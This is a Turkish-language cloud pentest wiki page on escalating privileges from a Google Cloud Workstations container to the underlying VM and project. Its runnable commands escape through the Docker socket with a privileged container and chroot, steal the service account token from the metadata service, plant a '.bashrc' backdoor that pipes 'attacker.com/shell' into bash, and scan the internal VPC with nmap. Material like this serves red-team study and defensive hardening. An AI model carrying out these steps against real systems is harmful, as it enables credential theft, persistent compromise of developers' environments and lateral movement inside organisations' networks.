# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

Cloud Workstations'taki ana yetki yükseltme yolu, geliştiriciler için **Docker-in-Docker (DinD)** iş akışlarını destekleme zorunluluğundan kaynaklanır. Workstation yapılandırması Docker socket'i mount ediyor veya privileged containers'a izin veriyorsa (yaygın bir yapılandırma), workstation konteyneri içindeki bir saldırgan altındaki Compute Engine VM'ine kaçıp onun service account token'ını çalabilir.

**Önkoşullar:**
- Cloud Workstation terminaline erişim (SSH ile, ele geçirilmiş bir oturumla veya çalınmış kimlik bilgileriyle)
- Workstation yapılandırması `/var/run/docker.sock`'u mount etmeli veya privileged containers'ı etkinleştirmeli

**Mimari bağlamı:** Workstation, bir Docker/Containerd runtime (Layer 2) üzerinde çalışan bir container (Layer 3) olup GCE VM (Layer 1) üzerinde çalışır. Docker socket, host'un container runtime'ına doğrudan erişim sağlar.

> [!NOTE]
> Bu araç [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) tam container escape sürecini otomatikleştirir ve sizi host VM'de root shell'e düşürür.

<details>

<summary>Adım 1: Docker socket'i kontrol et</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Adım 2: Escape to the host VM filesystem</summary>

Privileged container başlatıyoruz, host'un root dizinini `/mnt/host` olarak mount ediyoruz. Görünürlüğü maksimize etmek için host'un network ve PID namespace'ini de paylaşıyoruz.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
Şimdi altında çalışan Compute Engine VM üzerinde bir **root shell**'e sahipsiniz (Layer 1).

</details>

<details>

<summary>Adım 3: IMDS'ten VM service account token'ını çalın</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **Erişim izinlerini (Scopes) kontrol edin!**
> Eki olan Service Account **Editor** olsa bile, VM access scopes ile kısıtlanmış olabilir.
> Eğer `https://www.googleapis.com/auth/cloud-platform` görürseniz, tam erişiminiz vardır.
> Eğer sadece `logging.write` ve `monitoring.write` görüyorsanız, aşağıdaki **Network Pivot** ve **Persistence** vektörleriyle sınırlısınız.

<details>

<summary>Adım 4: Persistence Elde Et (Backdoor the User)</summary>

Cloud Workstations, kalıcı bir diski `/home/user` dizinine mount eder. Container kullanıcısı (genellikle `user`, UID 1000) host kullanıcısıyla (UID 1000) eşleştiği için host'un home dizinine yazabilirsiniz. Bu, workstation container yeniden oluşturulsa bile ortama backdoor yerleştirmenizi sağlar.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Adım 5: Network Pivot (Internal VPC Access)</summary>

Host network namespace (`--net=host`)'i paylaştığınız için artık VPC içinde güvenilen bir düğümsünüz. IP whitelisting'e dayalı erişime izin veren dahili servisleri tarayabilirsiniz.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
